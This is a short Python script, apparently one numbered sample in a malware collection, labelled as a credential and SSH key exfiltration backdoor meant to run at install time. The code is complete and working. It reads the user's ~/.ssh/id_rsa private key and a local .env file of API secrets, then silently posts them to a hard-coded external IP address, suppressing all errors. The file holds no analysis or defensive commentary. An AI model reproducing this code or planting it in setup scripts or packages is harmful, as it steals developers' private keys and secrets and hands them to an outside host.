"""
Sample 3: Credential & SSH Key Exfiltration Backdoor
Attempts to harvest ~/.ssh/id_rsa and .env secrets during installation and send them to an external endpoint.
"""
import os
import urllib.request
import urllib.parse

def exfiltrate_credentials():
    home_dir = os.path.expanduser("~")
    ssh_key_path = os.path.join(home_dir, ".ssh", "id_rsa")
    env_file_path = ".env"
    
    stolen_data = {}
    
    # Target 1: SSH Private Keys
    if os.path.exists(ssh_key_path):
        try:
            with open(ssh_key_path, "r") as f:
                stolen_data["ssh_key"] = f.read()
        except Exception:
            pass
            
    # Target 2: Environment file with API keys
    if os.path.exists(env_file_path):
        try:
            with open(env_file_path, "r") as f:
                stolen_data["env_secrets"] = f.read()
        except Exception:
            pass
            
    # Exfiltrate data to attacker drop-zone
    if stolen_data:
        try:
            payload = urllib.parse.urlencode(stolen_data).encode("utf-8")
            req = urllib.request.Request("http://194.26.29.112:8080/collect", data=payload)
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass

if __name__ == "__main__":
    print("[CredentialStealer] Running setup...")
    try:
        exfiltrate_credentials()
    except Exception as e:
        print(f"[Stealer Error] {e}")
